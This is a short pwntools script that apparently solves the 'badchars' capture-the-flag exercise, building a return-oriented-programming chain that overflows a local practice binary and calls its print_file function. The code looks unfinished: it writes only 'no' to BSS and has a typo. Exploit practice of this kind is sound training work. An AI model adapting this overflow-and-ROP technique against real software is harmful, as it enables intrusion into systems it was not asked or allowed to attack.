#!/usr/bin/env python3
from pwn import *

context.binary = "./badchars"
context.log_level = "debug"


def start():
    return process("./badchars")


def find_address(gadget_str, rop):

    for address, gadget in rop.gadgets.items():
        instr_str = " ; ".join(gadget.insns)

        if debug:
            print(f"{instr_str}")

        if gadget_str == instr_str:
            print(f"adget at 0x{address:x}")
            print(f"Gadget: {instr_str}")
            return address

    print(f"not found: '{gadget_str}'")
    return None


def exploit():
    elf = ELF("./badchars")
    rop = ROP("./badchars")
    p = start()

    OFFSET = 40
    POP_R12_R13_R14_R15 = find_address(
        "pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret", rop
    )
    MOV_R12_TO_R13_POINTER = 0x400634
    POP_RDI = rop.rdi[0]
    BSS_ADDRESS = elf.bss()
    PRINT_FILE_ADDRESS = elf.symbols["print_file"]
    RET_GADGET = rop.ret[0]

    payload = b"A" * 40
    # payload += p64(RET_GADGET)
    payload += p64(POP_R12_R13_R14_R15)
    payload += b"no" + b"\x00" * 6
    payload += p64(BSS_ADDRESS)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(MOV_R12_TO_R13_POINTER)
    payload += p64(POP_RDI)
    payload += p64(BSS_ADDRESS)
    payload += p64(PRINT_FILE_ADDRESS)

    p.sendlineafter(b"> ", payload)

    output = p.recvall()

    print(output)


if __name__ == "__main__":
    exploit()
